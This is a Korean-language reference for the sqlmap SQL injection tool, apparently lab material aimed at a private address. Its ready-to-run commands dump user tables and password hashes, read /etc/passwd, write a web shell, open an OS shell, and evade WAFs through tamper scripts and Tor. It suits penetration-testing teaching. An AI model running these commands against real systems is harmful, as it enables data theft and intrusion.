# sqlmap SQL Injection 자동화 레퍼런스

## 개요

sqlmap은 SQL Injection 취약점을 자동으로 탐지하고 익스플로잇하는 오픈소스 도구이다. 데이터베이스 열거, 데이터 추출, 파일 시스템 접근, OS 명령 실행까지 지원한다.

---

## 1. 기본 사용법

### URL 대상 (GET 파라미터)

```bash
# 기본 스캔
sqlmap -u "http://10.20.30.10/search?id=1"

# 특정 파라미터 지정
sqlmap -u "http://10.20.30.10/search?id=1&category=books" -p id

# 자동 응답 (비대화식)
sqlmap -u "http://10.20.30.10/search?id=1" --batch
```

### POST 데이터

```bash
# POST 요청
sqlmap -u "http://10.20.30.10/login" \
  --data="username=admin&password=test"

# 특정 파라미터
sqlmap -u "http://10.20.30.10/login" \
  --data="username=admin&password=test" -p username
```

### 쿠키 및 헤더

```bash
# 쿠키 포함
sqlmap -u "http://10.20.30.10/profile?id=1" \
  --cookie="PHPSESSID=abc123; role=user"

# 쿠키 파라미터 인젝션
sqlmap -u "http://10.20.30.10/profile" \
  --cookie="user_id=1*" --level=2

# 커스텀 헤더
sqlmap -u "http://10.20.30.10/api/users?id=1" \
  -H "Authorization: Bearer eyJhbGc..." \
  -H "X-Custom-Header: value"

# User-Agent 지정
sqlmap -u "http://10.20.30.10/search?id=1" \
  --random-agent

# Referer 인젝션
sqlmap -u "http://10.20.30.10/" \
  --headers="Referer: http://10.20.30.10/search?q=1*" --level=3
```

### 요청 파일 (Burp Suite 연동)

```bash
# Burp Suite에서 저장한 요청 파일 사용
sqlmap -r request.txt

# request.txt 예시:
# POST /login HTTP/1.1
# Host: 10.20.30.10
# Content-Type: application/x-www-form-urlencoded
# Cookie: PHPSESSID=abc123
#
# username=admin&password=test
```

---

## 2. 탐지 레벨 및 위험도

### --level (1~5)

탐지 시 테스트할 파라미터와 페이로드 범위를 조절한다.

| 레벨 | 테스트 대상                              |
|------|------------------------------------------|
| 1    | GET/POST 파라미터 (기본값)               |
| 2    | + 쿠키 파라미터                          |
| 3    | + User-Agent, Referer 헤더               |
| 4    | + 추가 페이로드                          |
| 5    | + 모든 가능한 페이로드 (매우 느림)       |

### --risk (1~3)

사용할 페이로드의 위험 수준을 조절한다.

| 위험도 | 설명                                      |
|--------|-------------------------------------------|
| 1      | 안전한 페이로드만 (기본값)                |
| 2      | + 시간 기반 블라인드 (Heavy 쿼리)         |
| 3      | + OR 기반 페이로드 (데이터 변경 가능!)    |

```bash
# 최대 탐지 (느리지만 철저)
sqlmap -u "http://10.20.30.10/search?id=1" --level=5 --risk=3

# 균형잡힌 설정
sqlmap -u "http://10.20.30.10/search?id=1" --level=3 --risk=2
```

---

## 3. 인젝션 기법

### --technique 옵션

| 문자 | 기법                         | 설명                        |
|------|------------------------------|-----------------------------|
| `B`  | Boolean-based blind          | 참/거짓 응답 차이 이용      |
| `E`  | Error-based                  | DB 에러 메시지 이용         |
| `U`  | UNION query-based            | UNION SELECT 이용           |
| `S`  | Stacked queries              | 세미콜론으로 쿼리 추가      |
| `T`  | Time-based blind             | 응답 시간 차이 이용         |
| `Q`  | Inline queries               | 인라인 서브쿼리 이용        |

```bash
# 특정 기법만 사용
sqlmap -u "http://10.20.30.10/search?id=1" --technique=BEU

# UNION 컬럼 수 지정
sqlmap -u "http://10.20.30.10/search?id=1" --union-cols=5

# 시간 기반 지연 설정
sqlmap -u "http://10.20.30.10/search?id=1" --time-sec=5
```

---

## 4. 데이터 추출

### 데이터베이스 열거

```bash
# DBMS 배너
sqlmap -u "http://10.20.30.10/search?id=1" -b

# 현재 사용자
sqlmap -u "http://10.20.30.10/search?id=1" --current-user

# 현재 데이터베이스
sqlmap -u "http://10.20.30.10/search?id=1" --current-db

# DBA 권한 확인
sqlmap -u "http://10.20.30.10/search?id=1" --is-dba

# 모든 데이터베이스 목록
sqlmap -u "http://10.20.30.10/search?id=1" --dbs

# 특정 DB의 테이블 목록
sqlmap -u "http://10.20.30.10/search?id=1" -D webapp --tables

# 특정 테이블의 컬럼 목록
sqlmap -u "http://10.20.30.10/search?id=1" -D webapp -T users --columns

# 데이터 덤프
sqlmap -u "http://10.20.30.10/search?id=1" -D webapp -T users --dump

# 특정 컬럼만 덤프
sqlmap -u "http://10.20.30.10/search?id=1" -D webapp -T users \
  -C username,password --dump

# 조건부 덤프 (WHERE)
sqlmap -u "http://10.20.30.10/search?id=1" -D webapp -T users \
  --dump --where="role='admin'"

# 행 수 제한
sqlmap -u "http://10.20.30.10/search?id=1" -D webapp -T users \
  --dump --start=1 --stop=10

# 모든 DB 전체 덤프
sqlmap -u "http://10.20.30.10/search?id=1" --dump-all

# 비밀번호 해시 덤프 + 크래킹
sqlmap -u "http://10.20.30.10/search?id=1" --passwords
```

### 사용자 및 권한

```bash
# 모든 사용자
sqlmap -u "http://10.20.30.10/search?id=1" --users

# 사용자 비밀번호 해시
sqlmap -u "http://10.20.30.10/search?id=1" --passwords

# 사용자 권한
sqlmap -u "http://10.20.30.10/search?id=1" --privileges

# 사용자 역할
sqlmap -u "http://10.20.30.10/search?id=1" --roles
```

---

## 5. 고급 기능

### 파일 시스템 접근 (DBA 권한 필요)

```bash
# 파일 읽기
sqlmap -u "http://10.20.30.10/search?id=1" \
  --file-read="/etc/passwd"

# 파일 쓰기 (웹쉘 업로드)
sqlmap -u "http://10.20.30.10/search?id=1" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"
```

### OS 명령 실행 (DBA 권한 필요)

```bash
# OS 셸 획득
sqlmap -u "http://10.20.30.10/search?id=1" --os-shell

# 단일 명령 실행
sqlmap -u "http://10.20.30.10/search?id=1" --os-cmd="id"

# SQL 셸
sqlmap -u "http://10.20.30.10/search?id=1" --sql-shell
```

---

## 6. 우회 기법 (--tamper)

WAF/IDS를 우회하기 위한 페이로드 변형 스크립트이다.

```bash
# 단일 탬퍼 스크립트
sqlmap -u "http://10.20.30.10/search?id=1" --tamper=space2comment

# 여러 탬퍼 스크립트 조합
sqlmap -u "http://10.20.30.10/search?id=1" \
  --tamper=space2comment,between,randomcase
```

### 주요 탬퍼 스크립트

| 스크립트             | 설명                                  | 예시                         |
|----------------------|---------------------------------------|------------------------------|
| `space2comment`      | 공백 → `/**/`                         | `1/**/UNION/**/SELECT`       |
| `space2plus`         | 공백 → `+`                            | `1+UNION+SELECT`             |
| `space2randomblank`  | 공백 → 랜덤 공백문자                 | `1%09UNION%0dSELECT`        |
| `between`            | `>` → `NOT BETWEEN 0 AND`            |                              |
| `randomcase`         | 키워드 대소문자 랜덤화               | `uNiOn SeLeCt`               |
| `charencode`         | URL 인코딩                            | `%55%4e%49%4f%4e`            |
| `chardoubleencode`   | 이중 URL 인코딩                       |                              |
| `unionalltounion`    | `UNION ALL` → `UNION`                |                              |
| `percentage`         | 키워드 사이 `%` 삽입                  | `U%N%I%O%N`                  |
| `equaltolike`        | `=` → `LIKE`                          |                              |
| `greatest`           | `>` → `GREATEST`                      |                              |
| `apostrophenullencode` | `'` → `%00%27`                      |                              |
| `halfversionedmorekeywords` | MySQL 버전 주석               | `/*!50000UNION*/`            |

```bash
# WAF 우회 조합 예시
# ModSecurity CRS 우회 시도
sqlmap -u "http://10.20.30.10/search?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=1

# 탬퍼 스크립트 목록 확인
sqlmap --list-tampers
```

---

## 7. 성능 및 연결 옵션

```bash
# 스레드 수 (기본 1)
sqlmap -u "http://10.20.30.10/search?id=1" --threads=5

# 요청 간 지연 (초)
sqlmap -u "http://10.20.30.10/search?id=1" --delay=1

# 타임아웃 (초)
sqlmap -u "http://10.20.30.10/search?id=1" --timeout=30

# 재시도 횟수
sqlmap -u "http://10.20.30.10/search?id=1" --retries=3

# 프록시 사용
sqlmap -u "http://10.20.30.10/search?id=1" \
  --proxy="http://127.0.0.1:8080"

# Tor 사용
sqlmap -u "http://10.20.30.10/search?id=1" \
  --tor --tor-type=SOCKS5 --check-tor

# 출력 상세도
sqlmap -u "http://10.20.30.10/search?id=1" -v 3   # 0~6
```

---

## 8. DBMS 지정

```bash
# 특정 DBMS 지정 (탐지 시간 단축)
sqlmap -u "http://10.20.30.10/search?id=1" --dbms=mysql
sqlmap -u "http://10.20.30.10/search?id=1" --dbms=postgresql
sqlmap -u "http://10.20.30.10/search?id=1" --dbms=mssql
sqlmap -u "http://10.20.30.10/search?id=1" --dbms=sqlite
sqlmap -u "http://10.20.30.10/search?id=1" --dbms=oracle
```

---

## 9. 실습 예제

### 예제 1: 기본 SQLi 탐지 및 데이터 추출

```bash
# 1단계: 취약점 확인
sqlmap -u "http://10.20.30.10/product?id=1" --batch

# 2단계: 데이터베이스 목록
sqlmap -u "http://10.20.30.10/product?id=1" --dbs --batch

# 3단계: 테이블 확인
sqlmap -u "http://10.20.30.10/product?id=1" -D shop --tables --batch

# 4단계: 사용자 테이블 덤프
sqlmap -u "http://10.20.30.10/product?id=1" \
  -D shop -T users -C username,password,email --dump --batch
```

### 예제 2: 로그인 폼 인젝션

```bash
sqlmap -u "http://10.20.30.10/login" \
  --data="username=admin&password=pass" \
  -p username \
  --dbms=mysql \
  --level=3 --risk=2 \
  --batch
```

### 예제 3: WAF 우회

```bash
sqlmap -u "http://10.20.30.10/search?q=test" \
  --tamper=space2comment,randomcase,between \
  --random-agent \
  --delay=2 \
  --level=3 --risk=2 \
  --dbms=mysql \
  --batch
```

### 예제 4: Burp 요청으로 테스트

```bash
# Burp Suite에서 요청 복사 → request.txt 저장
sqlmap -r request.txt \
  --level=3 --risk=2 \
  --threads=5 \
  --batch \
  --dump
```

---

## 10. 유용한 옵션 정리

```bash
--batch              # 비대화식 (기본 답변 자동 선택)
--flush-session      # 이전 세션 캐시 삭제
--fresh-queries      # 이전 쿼리 캐시 무시
--forms              # HTML 폼 자동 파싱
--crawl=3            # 깊이 3까지 크롤링
--output-dir=/tmp/   # 출력 디렉토리
--csv-del=","        # CSV 구분자
--answers="follow=Y" # 특정 질문에 자동 응답
--mobile             # 모바일 UA 사용
--purge              # 세션 데이터 완전 삭제
```

---

## 참고

- 공식 위키: https://github.com/sqlmapproject/sqlmap/wiki
- 사용법: `sqlmap -hh` (전체 도움말)
- 탬퍼 목록: `sqlmap --list-tampers`
